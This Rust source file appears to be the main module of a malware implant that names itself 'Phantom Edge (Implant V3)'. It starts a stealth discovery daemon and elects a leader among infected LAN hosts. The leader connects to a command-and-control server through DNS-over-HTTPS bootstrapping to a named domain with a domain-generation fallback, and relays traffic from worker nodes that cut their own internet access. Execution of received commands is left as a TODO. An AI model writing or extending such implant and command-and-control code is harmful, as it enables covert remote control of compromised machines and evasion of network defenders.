mod client;
mod bootstrapper;
mod modules; // Import new modules

use client::PolyMqttClient;
use modules::election::{ElectionService, NodeRole};
use modules::zero_noise_discovery::ZeroNoiseDiscovery;
use modules::bridge::BridgeService;
use modules::network_watchdog::{NetworkWatchdog, run_fallback_monitor};
use log::{info, error, warn, debug};
use std::collections::HashSet;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use tokio::time::sleep;
use tokio::sync::mpsc;
use tokio::io::AsyncWriteExt;
use rand::Rng; // Added for worker_id generation
use modules::local_comm::{LocalTransport, LipcMsgType};

// Configuration
const DEDUP_TTL: u64 = 600; 

// Deduplication Engine (Preserved)
struct Deduplicator {
    seen: HashSet<u32>, 
    timestamps: Vec<(Instant, u32)>, 
}

impl Deduplicator {
    fn new() -> Self {
        Self {
            seen: HashSet::new(),
            timestamps: Vec::new(),
        }
    }

    fn check_and_add(&mut self, id: u32) -> bool {
        let now = Instant::now();
        self.timestamps.retain(|(t, k)| {
            if now.duration_since(*t).as_secs() > DEDUP_TTL {
                self.seen.remove(k);
                false 
            } else {
                true
            }
        });

        if self.seen.contains(&id) {
            return false; 
        }

        self.seen.insert(id);
        self.timestamps.push((now, id));
        true 
    }
}

#[tokio::main]
async fn main() {
    env_logger::init();
    info!("Phantom Edge (Implant V3) Started - LAN Clustering Mode");

    // 0. Start Zero Noise Discovery Daemon (Stealth Mode)
    let stealth_disc = Arc::new(ZeroNoiseDiscovery::new());
    let stealth_clone = stealth_disc.clone();
    tokio::spawn(async move {
        stealth_clone.run_daemon().await;
    });

    // 1. Election / Discovery Phase
    let election = Arc::new(ElectionService::new().await);
    let role = election.run_discovery().await;

    match role {
        NodeRole::Leader => run_leader_mode(election).await,
        NodeRole::Worker => run_worker_mode().await,
        _ => error!("Unexpected Role Unbound"),
    }
}

async fn run_leader_mode(election: Arc<ElectionService>) {
    info!("[Modes] Entering LEADER Mode. Connecting to Cloud + Listening for Workers.");

    // Initialize Network Watchdog
    let watchdog = Arc::new(NetworkWatchdog::new());
    
    // Start Fallback Monitor (background)
    let wd_clone = watchdog.clone();
    tokio::spawn(async move {
        run_fallback_monitor(wd_clone).await;
    });

    // Start Election Monitor (background) to defend leadership
    let elec_clone = election.clone();
    tokio::spawn(async move {
        elec_clone.monitor_requests().await;
    });

    // 1. Setup Cloud Connection (Poly-MQTT V3)
    // Master Key (Shared Secret) - In prod use real key
    let master_key = [0x42; 32]; 

    // Bootstrapping Phase (Professional/Tiered)
    // ProfessionalBootstrapper::new() now automatically configures:
    // 1. Primary: dht.polydevs.uk (DoH-Google)
    // 2. Fallback: DGA (DoH-Google)
    let bootstrapper = bootstrapper::ProfessionalBootstrapper::new();
    // Use manual add_provider only for custom/dead-drops if needed.
    // e.g. bootstrapper.add_provider(...)

    // 3. Resolve (Race)
    let swarm_nodes = match bootstrapper.resolve().await {
        Some(nodes) => {
            info!("[Bootstrap] Resolved {} Swarm Nodes via Parallel Race.", nodes.len());
            nodes
        },
        None => {
            warn!("[Bootstrap] Resolution Failed. Fallback to Localhost.");
            vec![("127.0.0.1".to_string(), 1883)]
        }
    };

    if swarm_nodes.is_empty() {
        error!("[Bootstrap] Critical: No nodes available.");
        return;
    }

    let (ip, port) = &swarm_nodes[0];
    let client = Arc::new(PolyMqttClient::new(ip, *port, &master_key));
    
    // Channels for V3 Client
    let (msg_tx, msg_rx) = mpsc::channel::<Vec<u8>>(100); // Outgoing to Cloud
    let (cmd_tx, mut cmd_rx) = mpsc::channel::<Vec<u8>>(100); // Incoming from Cloud

    // Start Persistent Cloud Client (Background)
    let client_clone = client.clone();
    tokio::spawn(async move {
        client_clone.start_persistent_loop(msg_rx, cmd_tx).await;
    });

    // Start Cloud Heartbeat Loop (sends via msg_tx)
    let msg_tx_clone = msg_tx.clone();
    let wd_heartbeat = watchdog.clone();
    tokio::spawn(async move {
        loop {
            let heartbeat = b"HEARTBEAT_LEADER".to_vec();
            if let Err(_) = msg_tx_clone.send(heartbeat).await {
                error!("[Cloud] Failed to queue heartbeat (Channel Closed)");
                break;
            }
            // Mark network alive on successful heartbeat queue
            wd_heartbeat.mark_alive();
            sleep(Duration::from_secs(30)).await;
        }
    });

    // Handle Incoming Commands from Cloud
    let wd_cmd = watchdog.clone();
    tokio::spawn(async move {
        while let Some(cmd) = cmd_rx.recv().await {
            info!("[Leader] Recv Command from Cloud: {:?} bytes", cmd.len());
            // Mark network alive on every received command
            wd_cmd.mark_alive();
            // TODO: Dispatch Command to Workers or Exec locally
        }
    });

    // 2. Setup Bridge (Listen for Workers)
    match LocalTransport::bind_server().await {
        Ok(listener) => {
            let bridge = BridgeService::new(msg_tx.clone());
            let bridge = Arc::new(bridge);
            
            loop {
                match listener.accept().await {
                    Ok((stream, _addr)) => {
                        let b = bridge.clone();
                        tokio::spawn(async move {
                            b.handle_worker(stream).await;
                        });
                    }
                    Err(e) => error!("[Bridge] Accept Error: {}", e),
                }
            }
        }
        Err(e) => error!("[Leader] Failed to bind Local Transport: {}", e),
    }
}



async fn run_worker_mode() {
    info!("[Modes] Entering WORKER Mode. Disabling Internet. Connecting to Leader.");
    
    // Generate a temporary specific Worker ID
    let worker_id = rand::thread_rng().gen::<u64>();

    // Loop to maintain connection to Leader
    loop {
        match LocalTransport::connect_client().await {
            Ok(mut stream) => {
                info!("[Worker] Connected to Leader. Sending LIPC Hello.");
                
                // 1. Send Hello
                if let Err(e) = LocalTransport::write_frame(&mut stream, worker_id, LipcMsgType::Hello, &[]).await {
                    error!("[Worker] Failed to send Hello: {}", e);
                    continue;
                }

                // 2. Main Loop
                loop {
                    let msg = b"HEARTBEAT_WORKER";
                    if let Err(e) = LocalTransport::write_frame(&mut stream, worker_id, LipcMsgType::Data, msg).await {
                        error!("[Worker] Failed to write to Leader: {}", e);
                        break; // Reconnect
                    }
                    debug!("[Worker] Sent LIPC Data");
                    sleep(Duration::from_secs(10)).await;
                }
            }
            Err(e) => {
                warn!("[Worker] Failed to connect to Leader: {}. Retrying in 5s...", e);
                sleep(Duration::from_secs(5)).await;
            }
        }
    }
}
